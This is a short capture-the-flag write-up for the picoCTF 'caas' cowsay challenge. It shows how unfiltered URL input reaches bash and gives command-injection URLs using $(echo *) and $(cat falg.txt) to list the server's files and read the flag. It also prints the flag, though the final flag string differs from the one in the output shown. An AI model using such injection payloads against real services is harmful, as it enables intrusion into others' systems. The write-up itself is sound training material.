This chall is a very nice and easy one

Simply we have an unfiltered user input sent to a bash!!! PERFECT CHALL!

With some bash knowledge you know that `echo 00 $(echo 123)` will print out `00 123` which means that this snytax `$()` in bash will print out the output of the command inside it!

And since the chall gives us a bash terminal access using url we can simply type in `https://caas.mars.picoctf.net/cowsay/$(echo *)` this will print out all files/directories, you will get this output
```
 __________________________________
/ Dockerfile falg.txt index.js     \
| node_modules package.json public |
\ yarn.lock                        /
 ----------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

```

AMAMZING ISN'T IT!!
Now simply type in `https://caas.mars.picoctf.net/cowsay/$(cat falg.txt)` and you'll get
```
 _________________________________________
/ picoCTF{moooooooooooooooooooooooooooooo \
\ oooooooooooooooooooooooooooooo0o}       /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

```

There you go!! the flag is `picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`
